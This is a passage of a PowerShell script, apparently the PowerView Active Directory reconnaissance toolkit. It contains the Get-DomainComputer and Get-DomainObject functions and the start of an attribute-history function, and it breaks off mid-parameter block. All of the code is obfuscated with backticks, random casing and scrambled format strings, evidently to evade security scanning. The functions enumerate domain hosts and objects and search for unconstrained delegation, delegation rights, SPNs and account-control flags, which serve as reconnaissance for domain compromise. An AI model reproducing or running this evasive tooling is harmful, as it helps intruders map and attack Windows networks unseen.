        if (${PSbOU`Ndp`Ar`AMETe`RS}[("{0}{2}{1}" -f 'Pr','perties','o')]) { ${SeARCHERArG`U`m`eN`Ts}[("{3}{1}{2}{0}" -f 'ies','rop','ert','P')] = ${pRo`pE`RTieS} }
        if (${PsBOUN`dPA`RAmet`ers}[("{2}{1}{0}"-f 'e','earchBas','S')]) { ${search`er`Ar`gUM`EN`Ts}[("{2}{0}{1}" -f 'arch','Base','Se')] = ${sEaRch`B`Ase} }
        if (${Ps`Bou`NDPArAMe`TE`RS}[("{1}{0}" -f 'erver','S')]) { ${S`EA`Rch`ERARG`U`MENtS}[("{1}{0}"-f 'er','Serv')] = ${SE`RvER} }
        if (${PSbOUnd`pAR`A`m`EtERs}[("{1}{3}{2}{0}"-f 'pe','Sear','co','chS')]) { ${S`e`A`RChe`Rarg`UmeNts}[("{0}{2}{1}" -f'Sea','chScope','r')] = ${SE`ARCHsc`o`pe} }
        if (${PS`B`O`U`NdPaRAmEtERS}[("{2}{1}{0}" -f'geSize','esultPa','R')]) { ${s`EARc`her`A`RGUMENts}[("{2}{0}{3}{1}"-f 'ag','Size','ResultP','e')] = ${R`E`sUl`TpaGeSI`Ze} }
        if (${p`s`BOUnDP`ArA`meT`ERs}[("{1}{2}{0}{4}{3}"-f'Time','Ser','ver','imit','L')]) { ${SE`ARCH`eRAR`g`U`mEnTS}[("{2}{0}{1}"-f 'erTimeLim','it','Serv')] = ${seRv`e`RT`iMEli`mIT} }
        if (${pS`BOun`dPar`AM`ETErS}[("{2}{0}{1}" -f 'Mas','ks','Security')]) { ${s`EarCHer`ARG`UM`enTs}[("{2}{3}{0}{1}"-f'tyMa','sks','Sec','uri')] = ${SEcu`RIt`Ym`ASkS} }
        if (${P`SBouNdPaR`AM`et`e`RS}[("{0}{2}{1}" -f 'Tom','one','bst')]) { ${Se`ArcHeRa`RG`UmEN`TS}[("{2}{0}{3}{1}" -f'm','tone','To','bs')] = ${tomBs`TO`Ne} }
        if (${P`S`BoUNdPArAmEtE`Rs}[("{0}{1}{2}" -f 'Cred','e','ntial')]) { ${s`EAR`ChErA`RgU`MeN`TS}[("{2}{0}{1}"-f'e','dential','Cr')] = ${CR`EDEn`Ti`Al} }
        ${COMPS`ea`RcheR} = &("{2}{0}{1}{3}"-f'et-Doma','inSea','G','rcher') @SearcherArguments
    }

    PROCESS {

        if (${pSb`O`Und`ParAMeT`ERS} -and (${p`Sb`oU`Ndpar`AMEt`Ers}."Cou`Nt" -ne 0)) {
            &("{3}{1}{0}{5}{4}{2}" -f'm','na','meter','New-Dy','Para','ic') -CreateVariables -BoundParameters ${P`SboUN`DPAraMe`TErs}
        }

        if (${Co`m`PsE`ArcHeR}) {
            ${i`d`eNTItY`Fi`LTer} = ''
            ${fI`LTER} = ''
            ${I`denti`TY} | &("{0}{1}{3}{2}" -f 'W','her','ct','e-Obje') {${_}} | &("{0}{1}{2}{3}" -f'ForEach-O','b','j','ect') {
                ${iDE`NtiT`yInST`AncE} = ${_}.("{1}{0}" -f 'e','Replac').Invoke('(', '\28').("{0}{1}{2}" -f 'Re','pla','ce').Invoke(')', '\29')
                if (${id`eNtitYIns`T`AnCe} -match ("{1}{0}"-f '1-','^S-')) {
                    ${IDeNT`ity`FIlt`Er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdENT`I`TyinsTAn`Ce} -match ("{1}{0}"-f'N=','^C')) {
                    ${idEnT`iTyFIl`T`ER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsbOu`NDP`A`Ramet`erS}[("{1}{0}"-f 'in','Doma')]) -and (-not ${P`Sbo`Un`dPaR`AMeterS}[("{2}{0}{1}"-f'hBa','se','Searc')])) {

                        ${IdeN`T`Itydo`m`AiN} = ${ideNtIT`YinSTa`N`ce}.("{0}{2}{1}"-f'SubS','ng','tri').Invoke(${identityINSt`A`N`ce}.("{2}{0}{1}"-f'de','xOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{0}"-f 'bose','er','Write-V') ('[Get-'+'Doma'+'in'+'Compu'+'te'+'r] '+'Extr'+'act'+'e'+'d '+'d'+'omain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${SEaRcHer`ArGUmE`N`Ts}[("{1}{0}"-f'ain','Dom')] = ${i`dENTI`T`YDOMaIn}
                        ${cOmPSearC`H`er} = &("{2}{3}{0}{4}{1}" -f'DomainS','rcher','G','et-','ea') @SearcherArguments
                        if (-not ${C`OM`PSe`ARc`HeR}) {
                            &("{3}{2}{1}{0}"-f'ng','rni','e-Wa','Writ') ('['+'Get'+'-Domai'+'nCom'+'pu'+'ter] '+'Unab'+'le'+' '+'t'+'o '+'retri'+'ev'+'e '+'d'+'oma'+'in '+'s'+'earcher '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${ide`NtIt`YI`Nst`An`Ce}.("{1}{2}{0}"-f 'ins','C','onta').Invoke('.')) {
                    ${IDENT`I`TYfilteR} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${i`d`E`NTitYI`N`StancE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`UiDbY`Tes`TriNG} = (([Guid]${i`DEN`Ti`TyInst`ANCE}).("{2}{0}{1}"-f 'oB','yteArray','T').Invoke() | &("{1}{0}{2}"-f 'c','ForEach-Obje','t') { '\' + ${_}.("{2}{1}{0}"-f'ng','oStri','T').Invoke('X2') }) -join ''
                    ${IdEn`T`ITyFIltER} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${ideN`T`iT`yfi`ltER} += "(name=$IdentityInstance)"
                }
            }
            if (${i`DEnTI`T`YF`iltEr} -and (${iDe`N`TiTyFilt`eR}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') ) {
                ${FilT`ER} += "(|$IdentityFilter)"
            }

            if (${ps`BOU`Nd`parAMe`Te`Rs}[("{3}{0}{4}{2}{1}"-f 'n','ed','n','Unco','strai')]) {
                &("{2}{1}{0}{3}"-f 'te-Verbo','ri','W','se') ("{11}{1}{15}{18}{2}{17}{13}{21}{9}{3}{0}{4}{7}{12}{10}{20}{14}{5}{6}{22}{8}{19}{16}"-f'r c','Dom','put','o','ompu','or uncon','st','ters','ained d','earching f','it','[Get-',' w','r] ',' f','ainCo','ion','e','m','elegat','h','S','r')
                ${F`il`TER} += ("{0}{1}{5}{2}{3}{4}{6}{9}{8}{7}"-f '(userA','ccountControl:','.','2.840.113556.1.','4.8','1','03','288)','524',':=')
            }
            if (${Ps`B`O`UNd`PAra`mETerS}[("{2}{0}{1}"-f'A','uth','TrustedTo')]) {
                &("{1}{2}{0}"-f'-Verbose','W','rite') ("{18}{22}{6}{7}{11}{0}{23}{17}{13}{1}{14}{9}{2}{3}{10}{16}{15}{20}{5}{19}{4}{12}{21}{8}" -f 'or ',' t','ed',' to','in','for ','om','puter] Search','s','e trust',' authe','ing f','ci','s','hat ar','t','n','uter','[Get-','other pr','icate ','pal','DomainC','comp')
                ${fIL`TeR} += (("{8}{4}{5}{0}{2}{3}{6}{1}{7}" -f 'to','et','de','le','llow','ed','gat','o=*)','(msds-a'))
            }
            if (${PSB`O`UnDparAm`ETers}[("{1}{2}{0}"-f's','Pr','inter')]) {
                &("{2}{1}{0}" -f 'rbose','e','Write-V') ("{10}{0}{5}{6}{7}{1}{2}{8}{4}{9}{3}" -f'Get-D','e','a','s','h','omainC','omputer','] S','rc','ing for printer','[')
                ${fIl`T`er} += ("{2}{1}{6}{4}{3}{0}{5}"-f 'gory=printQueue','ob','(','ate','C',')','ject')
            }
            if (${pS`BO`U`NdPar`AMETe`Rs}['SPN']) {
                &("{2}{0}{1}" -f 'r','bose','Write-Ve') ('[Ge'+'t'+'-Domai'+'nCo'+'mputer] '+'S'+'earch'+'ing '+'fo'+'r '+'co'+'m'+'puters '+'wi'+'th '+'SPN:'+' '+"$SPN")
                ${F`Il`TEr} += "(servicePrincipalName=$SPN)"
            }
            if (${p`sBo`UNDpA`RAmEtERs}[("{0}{1}{2}" -f 'Ope','ratingSy','stem')]) {
                &("{3}{2}{1}{0}" -f 'se','-Verbo','te','Wri') ('['+'G'+'et-DomainC'+'omp'+'ut'+'er]'+' '+'Searchi'+'n'+'g '+'fo'+'r '+'com'+'p'+'uters'+' '+'wi'+'th '+'o'+'pera'+'t'+'ing '+'syst'+'em:'+' '+"$OperatingSystem")
                ${FI`Lt`ER} += "(operatingsystem=$OperatingSystem)"
            }
            if (${PSBoUN`d`pArAm`EtErS}[("{2}{1}{0}" -f 'ePack','c','Servi')]) {
                &("{2}{1}{0}" -f'se','rite-Verbo','W') ('[Get-'+'Doma'+'i'+'nCom'+'puter] '+'Sea'+'r'+'ching '+'for'+' '+'co'+'mpu'+'ters '+'with'+' '+'s'+'ervi'+'ce '+'pack:'+' '+"$ServicePack")
                ${F`ilT`Er} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${psbo`UND`Pa`RamE`TErS}[("{2}{1}{0}"-f 'Name','e','Sit')]) {
                &("{3}{1}{0}{2}" -f 'e','t','-Verbose','Wri') ('['+'Get-'+'D'+'omai'+'n'+'Computer]'+' '+'Searc'+'hi'+'ng '+'for'+' '+'co'+'mpute'+'rs '+'wi'+'th '+'site'+' '+'name:'+' '+"$SiteName")
                ${Fil`T`ER} += "(serverreferencebl=$SiteName)"
            }
            if (${P`sB`o`UNdPARameTErS}[("{1}{3}{0}{2}" -f 'lt','L','er','DAPFi')]) {
                &("{1}{2}{0}{3}"-f 'o','W','rite-Verb','se') ('['+'Ge'+'t-Doma'+'inCo'+'mpute'+'r] '+'Using'+' '+'a'+'ddi'+'tio'+'nal '+'LDA'+'P '+'filter'+': '+"$LDAPFilter")
                ${f`Ilt`eR} += "$LDAPFilter"
            }

            ${uac`F`ilTER} | &("{2}{0}{1}"-f'-','Object','Where') {${_}} | &("{0}{1}{2}"-f'ForEac','h','-Object') {
                if (${_} -match ("{2}{1}{0}" -f '_.*','T','NO')) {
                    ${U`ACfI`ELD} = ${_}.("{1}{0}{2}" -f 'tri','Subs','ng').Invoke(4)
                    ${UAcvA`L`UE} = [Int](${u`Ac`enUm}::${UacF`i`e`LD})
                    ${f`iLtER} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uaCV`A`lUE} = [Int](${UaCe`N`Um}::${_})
                    ${Fi`l`TER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${COM`PSEAr`CHeR}."FI`LT`er" = "(&(samAccountType=805306369)$Filter)"
            &("{1}{0}{2}{3}" -f'i','Wr','te-Ver','bose') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${pSBoUNdpa`R`AM`eTERS}[("{0}{1}" -f'Find','One')]) { ${reS`U`Lts} = ${co`MPseAr`CHEr}.("{2}{0}{1}"-f'ndO','ne','Fi').Invoke() }
            else { ${R`EsUl`TS} = ${Com`p`sEa`RcH`eR}.("{0}{1}{2}" -f'Fi','nd','All').Invoke() }
            ${R`EsU`LtS} | &("{0}{3}{2}{1}" -f'W','bject','re-O','he') {${_}} | &("{3}{2}{0}{1}"-f'j','ect','ach-Ob','ForE') {
                ${U`P} = ${TR`Ue}
                if (${Psbo`UN`dp`ArAMEters}[("{0}{1}" -f'P','ing')]) {
                    ${u`p} = &("{0}{1}{4}{3}{2}" -f 'Tes','t-Co','n','ectio','nn') -Count 1 -Quiet -ComputerName ${_}."pRO`PErt`iEs"."dnS`h`OS`TNAmE"
                }
                if (${uP}) {
                    if (${pSBouND`pARAM`eT`ers}['Raw']) {

                        ${CO`MPU`TER} = ${_}
                        ${co`m`PUTeR}."ps`obJE`CT"."T`YP`enA`mes".("{1}{0}"-f't','Inser').Invoke(0, ("{4}{5}{1}{2}{0}{6}{3}" -f '.Co','rV','iew','er.Raw','Pow','e','mput'))
                    }
                    else {
                        ${CoMpUT`ER} = &("{1}{5}{3}{0}{6}{2}{4}"-f'Prop','C','r','ert-LDAP','ty','onv','e') -Properties ${_}."p`ROPerTi`es"
                        ${cOMp`U`TEr}."p`SoB`JEcT"."Ty`P`eNaMES".("{0}{1}"-f'I','nsert').Invoke(0, ("{0}{1}{3}{4}{2}" -f'PowerV','iew.','uter','C','omp'))
                    }
                    ${ComPU`T`er}
                }
            }
            if (${RE`sUlTs}) {
                try { ${ResU`lts}.("{1}{0}"-f 'se','dispo').Invoke() }
                catch {
                    &("{2}{1}{0}" -f 'se','bo','Write-Ver') ('[Get-Domain'+'Com'+'pu'+'ter] '+'Erro'+'r'+' '+'disp'+'osin'+'g '+'o'+'f '+'the'+' '+'Re'+'su'+'lts '+'o'+'bj'+'ect: '+"$_")
                }
            }
            ${COMPs`ea`RchER}.("{0}{1}"-f 'disp','ose').Invoke()
        }
    }
}

function gEt-`Do`MAin`o`BJeCt {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{6}{8}{7}{0}{4}{2}{5}{9}{3}" -f'dVarsM','PSUseD','ThanA','gnments','ore','s','ec','re','la','si'}, '')]
    [OutputType({"{2}{3}{4}{5}{1}{0}"-f'ct','Obje','PowerVi','e','w.','AD'})]
    [OutputType({"{6}{5}{1}{0}{4}{2}{3}"-f'A','ew.','Object.R','aw','D','owerVi','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTiON = 0, valUefrOmpipELINe = ${T`Rue}, vaLUefROMPipElINeByPROpeRtYnamE = ${TR`UE})]
        [Alias({"{0}{4}{2}{1}{3}" -f 'Di','edNam','nguish','e','sti'}, {"{2}{0}{1}"-f 'mAccountN','ame','Sa'}, {"{1}{0}"-f 'e','Nam'}, {"{5}{1}{2}{3}{4}{0}"-f 'Name','emb','erDistingui','s','hed','M'}, {"{2}{3}{0}{1}"-f'N','ame','Me','mber'})]
        [String[]]
        ${i`dent`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'il','F','ter'})]
        [String]
        ${l`DaPf`IL`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pro`pE`RTIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'at','h','ADSP'})]
        [String]
        ${SeAr`c`HBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{1}{0}" -f 'ller','o','om','D','ainContr'})]
        [String]
        ${s`erv`er},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{2}{1}{0}" -f'l','neLeve','O'}, {"{0}{1}"-f'Sub','tree'})]
        [String]
        ${sEARChsC`o`Pe} = ("{1}{0}"-f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESu`l`TpAGESI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`VErt`im`ELIMit},

        [ValidateSet({"{1}{0}" -f'acl','D'}, {"{0}{1}" -f 'G','roup'}, {"{0}{1}"-f 'No','ne'}, {"{0}{1}"-f 'Owne','r'}, {"{1}{0}"-f 'cl','Sa'})]
        [String]
        ${Se`Cu`Rity`maS`KS},

        [Switch]
        ${tOMB`ST`One},

        [Alias({"{2}{1}{0}"-f 'turnOne','e','R'})]
        [Switch]
        ${Fi`NdO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDe`N`TIAl} =  ${p`kF`eZn}::"Emp`Ty",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${UaC`VaLUENAM`ES} =   ${CjI`6`K1}::("{1}{2}{0}" -f's','GetN','ame').Invoke(${ua`Ce`NUM})

        ${Ua`CVa`LuE`NAm`eS} = ${U`AcVa`LUe`NaMes} | &("{0}{3}{2}{4}{1}"-f 'F','-Object','a','orE','ch') {${_}; "NOT_$_"}

        &("{1}{0}{3}{2}{4}"-f'-DynamicP','New','e','aramet','r') -Name ("{2}{1}{0}"-f'r','lte','UACFi') -ValidateSet ${uAc`Val`UeNaM`es} -Type ([array])
    }

    BEGIN {
        ${searCHe`RA`RGUMEn`TS} = @{}
        if (${PSbO`U`Nd`PAraMetErS}[("{0}{1}{2}"-f'D','o','main')]) { ${se`ARcHe`RarGU`mEn`TS}[("{1}{0}" -f'n','Domai')] = ${DOM`A`in} }
        if (${PSBOUN`dpar`AMEtE`RS}[("{0}{1}{2}{3}"-f 'P','ro','pertie','s')]) { ${se`AR`ch`erARGUmE`Nts}[("{0}{1}{2}" -f'Pr','opertie','s')] = ${p`ROp`ErT`ies} }
        if (${p`s`BOUnDP`ARaM`ET`ers}[("{0}{1}{2}" -f'Sea','rchBa','se')]) { ${Se`ArC`h`eRArgumeNTs}[("{0}{1}{2}"-f'Searc','hB','ase')] = ${SEA`R`cHBA`Se} }
        if (${p`sbOUnDpAr`AmE`TeRS}[("{0}{1}" -f'Ser','ver')]) { ${Se`ArChERAr`g`U`meNtS}[("{1}{2}{0}" -f 'er','Se','rv')] = ${SE`R`Ver} }
        if (${Ps`BoU`NdParam`eT`Ers}[("{0}{1}{2}" -f 'SearchSco','p','e')]) { ${sEArC`H`ErA`RGUM`eNTS}[("{1}{0}{3}{2}" -f 'arc','Se','Scope','h')] = ${SEarcH`S`cO`pe} }
        if (${PsbOundp`ARa`me`T`E`RS}[("{1}{2}{3}{0}" -f'ize','ResultP','age','S')]) { ${S`E`Arc`h`ErA`RGUMENts}[("{2}{3}{1}{0}{4}"-f 'ltPa','su','R','e','geSize')] = ${reSul`T`pAGesIZe} }
        if (${PS`BOUnD`PAram`eTERS}[("{3}{0}{1}{2}" -f'ime','L','imit','ServerT')]) { ${sEarCHERa`R`gUMe`N`Ts}[("{4}{1}{3}{0}{2}"-f 'imi','e','t','rTimeL','Serv')] = ${ser`Ve`R`TImElI`MiT} }
        if (${Ps`BoUnD`paramET`ers}[("{1}{2}{0}"-f 'Masks','Sec','urity')]) { ${SEAr`cHera`RgU`mENTs}[("{0}{1}{2}{3}"-f 'Se','cu','rityM','asks')] = ${S`eCUr`itYMa`s`kS} }
        if (${psBoUNDP`AR`AM`Eters}[("{0}{1}{2}"-f 'T','om','bstone')]) { ${s`earchERArGu`mE`NTS}[("{2}{0}{1}"-f'bs','tone','Tom')] = ${Tom`B`s`TonE} }
        if (${psB`ouNdP`Ara`me`TE`Rs}[("{0}{2}{1}"-f 'Cr','tial','eden')]) { ${SEa`R`ChERArGU`mEN`TS}[("{0}{1}{2}" -f'Cr','edent','ial')] = ${c`R`edenT`IaL} }
        ${objE`CTs`eaRCheR} = &("{0}{1}{4}{2}{3}" -f'Get-Do','mai','Se','archer','n') @SearcherArguments
    }

    PROCESS {

        if (${PsBOundP`Ar`A`meteRS} -and (${psBo`UnD`PAr`AmE`TErs}."cou`Nt" -ne 0)) {
            &("{3}{1}{2}{4}{0}" -f'er','ew','-Dy','N','namicParamet') -CreateVariables -BoundParameters ${psboU`N`D`PaRAMe`T`ErS}
        }
        if (${Ob`jEct`s`ear`Cher}) {
            ${i`d`E`NtiTyFILtER} = ''
            ${Filt`ER} = ''
            ${i`D`Entity} | &("{2}{1}{0}" -f't','e-Objec','Wher') {${_}} | &("{1}{2}{0}{3}"-f 'bje','ForEach','-O','ct') {
                ${Ide`NTitY`i`NSTANCE} = ${_}.("{1}{0}{2}"-f'pla','Re','ce').Invoke('(', '\28').("{1}{0}"-f 'ace','Repl').Invoke(')', '\29')
                if (${iDEntI`Ty`iN`stan`cE} -match ("{1}{0}"-f'-1-','^S')) {
                    ${ide`NtI`Ty`Fi`LTer} += "(objectsid=$IdentityInstance)"
                }
                elseif (${Id`eN`T`I`TYinstAncE} -match ((("{4}{3}{2}{1}{0}" -f 'y4kDC)=','kOU','4','Ny','^(C')) -CrEplaCe'y4k',[Char]124)) {
                    ${iDEN`TiTy`FiL`TER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`sbo`U`Nd`P`ArAMEtERS}[("{0}{1}"-f 'Domai','n')]) -and (-not ${pSbouNd`PaRA`Me`T`e`RS}[("{0}{1}{2}" -f 'S','ear','chBase')])) {

                        ${iDeNTi`Ty`DoM`AIN} = ${I`D`eNT`iTYInST`An`Ce}.("{0}{1}{2}" -f 'SubS','tri','ng').Invoke(${IDeNT`IT`YinSt`AN`ce}.("{0}{1}"-f 'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{3}{0}{1}"-f'ite-','Verbose','W','r') ('['+'Get-D'+'oma'+'inOb'+'ject] '+'E'+'xtr'+'acted '+'dom'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${SEaRc`HERa`R`gUmeNTS}[("{0}{1}{2}" -f 'Do','m','ain')] = ${iD`eN`Ti`TyDom`AIN}
                        ${ObJ`Ec`Ts`eaRChER} = &("{2}{0}{4}{3}{1}" -f'n','r','Get-Domai','rche','Sea') @SearcherArguments
                        if (-not ${O`BJE`Ct`s`earchER}) {
                            &("{0}{1}{3}{2}" -f'Writ','e','ng','-Warni') ('[Get-Dom'+'a'+'inObjec'+'t] '+'U'+'nab'+'le '+'t'+'o '+'re'+'trieve '+'do'+'main '+'s'+'e'+'archer '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${ID`ent`ITYINs`TaNCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${Gu`idbytE`st`Ri`NG} = (([Guid]${I`DenTi`TY`i`NStA`NcE}).("{0}{1}{2}" -f'ToByt','e','Array').Invoke() | &("{4}{1}{2}{3}{0}" -f 'ct','ch-','O','bje','ForEa') { '\' + ${_}.("{0}{2}{1}"-f 'ToStr','g','in').Invoke('X2') }) -join ''
                    ${ID`EnTiTyfIl`Ter} += "(objectguid=$GuidByteString)"
                }
                elseif (${IdeN`TITy`I`NstAnCE}.("{1}{0}"-f'ns','Contai').Invoke('\')) {
                    ${coNvER`Te`diDEN`TItyiNstAn`ce} = ${id`EN`Ti`Tyi`NsTanCE}.("{0}{1}" -f'R','eplace').Invoke('\28', '(').("{0}{1}" -f 'Repla','ce').Invoke('\29', ')') | &("{0}{2}{1}" -f'Conve','DName','rt-A') -OutputType ("{0}{1}{2}"-f'C','anoni','cal')
                    if (${c`oNvEr`TE`dIDe`NtiT`y`In`StanCe}) {
                        ${OBJ`eCt`dOM`A`in} = ${Con`VE`RTEDideN`TItY`i`NS`TaNCE}.("{2}{1}{0}" -f 'bString','u','S').Invoke(0, ${c`onv`eR`T`E`DidEnTitYi`Nsta`Nce}.("{1}{0}"-f 'Of','Index').Invoke('/'))
                        ${O`BJE`ctNa`Me} = ${IDe`NT`i`TYinstA`NcE}.("{1}{0}"-f'plit','S').Invoke('\')[1]
                        ${iDEn`T`It`YFIlTER} += "(samAccountName=$ObjectName)"
                        ${sEA`R`c`he`Ra`RGuMENTS}[("{0}{1}" -f 'Domai','n')] = ${oBJ`ecTdOMA`In}
                        &("{1}{0}{2}{3}"-f 'e','Writ','-Verb','ose') ('[Ge'+'t-'+'Domain'+'Obj'+'ect]'+' '+'Extrac'+'ted'+' '+'d'+'om'+'ain '+"'$ObjectDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${OB`jeC`T`seARc`HeR} = &("{3}{2}{1}{0}" -f 'rcher','ea','mainS','Get-Do') @SearcherArguments
                    }
                }
                elseif (${I`D`ENTi`TYInS`TanCe}.("{0}{1}{2}" -f 'C','on','tains').Invoke('.')) {
                    ${Id`enTI`TYFi`LTEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${I`de`NTI`TYFILTEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${i`DENTI`Ty`FI`lTEr} -and (${iDe`N`TI`TyfILt`ER}.("{0}{1}" -f 'Tri','m').Invoke() -ne '') ) {
                ${f`Ilt`Er} += "(|$IdentityFilter)"
            }

            if (${psBO`U`NdParamE`TeRs}[("{1}{2}{0}" -f 'lter','LDA','PFi')]) {
                &("{2}{1}{0}"-f'ose','e-Verb','Writ') ('[Ge'+'t-'+'DomainObj'+'ec'+'t] '+'U'+'sin'+'g '+'addi'+'tio'+'na'+'l '+'LDAP'+' '+'fi'+'lter'+': '+"$LDAPFilter")
                ${fILT`ER} += "$LDAPFilter"
            }

            ${Uacfi`l`T`er} | &("{2}{1}{0}" -f'bject','here-O','W') {${_}} | &("{0}{4}{1}{2}{3}" -f 'ForEa','Obje','c','t','ch-') {
                if (${_} -match ("{0}{2}{1}"-f'NO','_.*','T')) {
                    ${UaC`FiE`ld} = ${_}.("{1}{0}{2}"-f'trin','Subs','g').Invoke(4)
                    ${uacVA`L`Ue} = [Int](${ua`c`EnUM}::${ua`c`FieLD})
                    ${Fi`lt`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${Uac`Va`lue} = [Int](${uAcEn`Um}::${_})
                    ${fIl`TEr} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${FIlT`eR} -and ${f`iLTER} -ne '') {
                ${ob`jec`TS`EARcHER}."Fi`Lt`er" = "(&$Filter)"
            }
            &("{1}{0}{2}{3}"-f'rite-Ve','W','r','bose') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${Ps`BOU`NDPaRam`EtERs}[("{2}{0}{1}" -f'n','dOne','Fi')]) { ${RE`Su`LTS} = ${O`BJ`ECtSeAr`CHEr}.("{2}{1}{0}"-f'One','nd','Fi').Invoke() }
            else { ${r`E`SUlts} = ${O`BJE`ctseaR`cHEr}.("{0}{2}{1}" -f 'Fin','l','dAl').Invoke() }
            ${R`Es`ULtS} | &("{2}{0}{1}" -f'-Obje','ct','Where') {${_}} | &("{2}{0}{1}"-f'orEach-Obj','ect','F') {
                if (${p`sB`OuN`dpaRAme`T`Ers}['Raw']) {

                    ${OBJ`e`Ct} = ${_}
                    ${ob`jEct}."Ps`O`BJect"."ty`P`eNAMEs".("{0}{1}"-f 'Inser','t').Invoke(0, ("{0}{2}{1}{3}{4}"-f 'Powe','i','rV','ew.ADO','bject.Raw'))
                }
                else {
                    ${O`B`JECt} = &("{0}{1}{5}{3}{6}{4}{2}"-f'Co','nve','rty','-L','pe','rt','DAPPro') -Properties ${_}."proPe`RT`iES"
                    ${ObJ`E`ct}."PsObj`e`Ct"."t`YPENA`MES".("{1}{0}{2}"-f'nser','I','t').Invoke(0, ("{0}{5}{4}{2}{3}{1}" -f 'P','ct','Obj','e','erView.AD','ow'))
                }
                ${Obje`ct}
            }
            if (${RE`sul`Ts}) {
                try { ${reS`Ul`TS}.("{1}{0}"-f 'se','dispo').Invoke() }
                catch {
                    &("{0}{1}{2}{3}"-f'W','ri','te-Verb','ose') ('[G'+'et-D'+'oma'+'inObject] '+'E'+'rror '+'d'+'isp'+'osing'+' '+'o'+'f '+'t'+'he '+'R'+'esults'+' '+'o'+'bject:'+' '+"$_")
                }
            }
            ${OBjE`CtSEArC`h`eR}.("{1}{0}{2}"-f'p','dis','ose').Invoke()
        }
    }
}

function G`Et-DO`maInOB`JEct`ATTRIBUTe`HisToRY {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{5}{3}{1}{2}"-f'SUseDeclaredV','ThanAs','signments','sMore','P','ar'}, '')]
    [OutputType({"{8}{9}{7}{1}{5}{3}{0}{6}{4}{2}" -f 'ribu','ct','y','t','istor','At','teH','je','PowerView.A','DOb'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTion = 0, vaLuEFROMPipELInE = ${t`RuE}, VALueFROmPIPelInEbyPrOPERtyNAMe = ${t`RUE})]
        [Alias({"{2}{3}{1}{4}{0}" -f'ame','i','Dis','t','nguishedN'}, {"{2}{3}{1}{0}" -f 'e','tNam','Sam','Accoun'}, {"{0}{1}" -f 'Na','me'}, {"{6}{0}{1}{4}{5}{2}{3}" -f 'emb','er','u','ishedName','D','isting','M'}, {"{1}{3}{2}{0}"-f'rName','Mem','e','b'})]
        [String[]]
        ${IdeN`T`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ilter','F'})]
        [String]
        ${L`d`APFILt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`OPER`T`ieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ath','ADSP'})]
        [String]
        ${S`EArcHBA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{4}{3}{0}" -f 'troller','omai','D','on','nC'})]
        [String]
        ${s`E`RVeR},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{1}{2}" -f'On','eLeve','l'}, {"{0}{1}{2}"-f 'Su','btr','ee'})]
        [String]
        ${sear`CH`S`coPe} = ("{0}{1}" -f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`e`SUlt`pa`GEsIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`erve`RtImeli`Mit},

        [Switch]
        ${tOM`B`StO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`dENTIAl} =  ${PK`F`EZn}::"EMP`TY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${sEaRChe`RaRG`UM`entS} = @{
            ("{0}{2}{1}"-f'P','s','ropertie')    =   ("{4}{2}{0}{3}{1}{5}" -f'eme','ada','attribut','t','msds-repl','ta'),("{4}{0}{2}{3}{5}{1}" -f 'st','e','in','guish','di','ednam')
